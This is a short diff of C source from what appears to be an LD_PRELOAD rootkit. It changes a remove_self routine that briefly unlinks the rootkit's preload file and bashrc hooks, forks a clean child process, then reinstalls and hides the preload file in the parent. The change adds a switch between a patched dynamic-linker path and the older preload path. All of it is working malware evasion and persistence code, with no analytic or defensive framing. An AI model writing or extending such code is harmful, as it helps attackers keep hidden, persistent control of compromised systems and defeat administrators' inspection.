@@ -3,20 +3,28 @@ int remove_self(void){
         return VINVALID_PERM;
 
     hook(CUNLINK);
+#ifdef PATCH_DYNAMIC_LINKER
     call(CUNLINK, PRELOAD_FILE);
+#else
+    call(CUNLINK, OLD_PRELOAD);
+#endif
 #ifdef ROOTKIT_BASHRC
     call(CUNLINK, BASHRC_PATH);
     call(CUNLINK, BASHRC_PATH);
 #endif
 
     pid_t pid;
-    if((pid = fork()) == -1) return VFORK_ERR;   /* if we can't fork, return error */
-    else if(pid == 0) return VFORK_SUC;          /* return VFORK_SUC in the child */
+    if((pid = fork()) < 0) return VFORK_ERR;
+    else if(pid == 0) return VFORK_SUC;
 
-    /* continue in the parent process */
     wait(NULL);
-    reinstall();               /* rewrite our preload file */
-    hide_path(PRELOAD_FILE);   /* and hide it */
+#ifdef PATCH_DYNAMIC_LINKER
+    reinstall(PRELOAD_FILE);
+    hide_path(PRELOAD_FILE);
+#else
+    reinstall(OLD_PRELOAD);
+    hide_path(OLD_PRELOAD);
+#endif
     return VEVADE_DONE;
 }
 
